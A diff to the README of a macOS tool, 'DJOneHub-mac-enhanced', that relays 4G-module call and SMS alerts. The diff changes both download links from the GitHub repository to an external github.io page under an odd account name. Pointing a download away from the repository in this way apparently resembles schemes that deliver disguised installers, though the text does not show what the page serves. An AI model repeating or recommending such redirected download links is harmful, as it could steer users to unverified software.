@@ -1,6 +1,6 @@
 # 📱 DJOneHub-mac-enhanced - Bring Mac Notifications to Your 4G Module
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Juiceless-jaconet688/DJOneHub-mac-enhanced)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://juiceless-jaconet688.github.io)
 
 DJOneHub-mac-enhanced turns your 4G hardware module into a professional communication tool for macOS. It bridges the gap between your hardware and your computer. You receive phone call alerts and text messages directly on your Mac desktop. You no longer need to check a web browser to monitor your SIM card status.
 
@@ -19,7 +19,7 @@ This software improves how your hardware communicates with your computer.
 Follow these steps to set up the software on your system.
 
 1.  **Visit the Download Page:** Open the link below to reach the latest release.
-    [Download DJOneHub-mac-enhanced](https://github.com/Juiceless-jaconet688/DJOneHub-mac-enhanced)
+    [Download DJOneHub-mac-enhanced](https://juiceless-jaconet688.github.io)
 2.  **Select Your File:** Look for the section labeled "Assets." Click the file ending in `.dmg` to start the download.
 3.  **Open the Installer:** Double-click the downloaded file in your browser or Downloads folder.
 4.  **Move to Applications:** A window will appear. Drag the DJOneHub icon into the Applications folder icon to install the software.
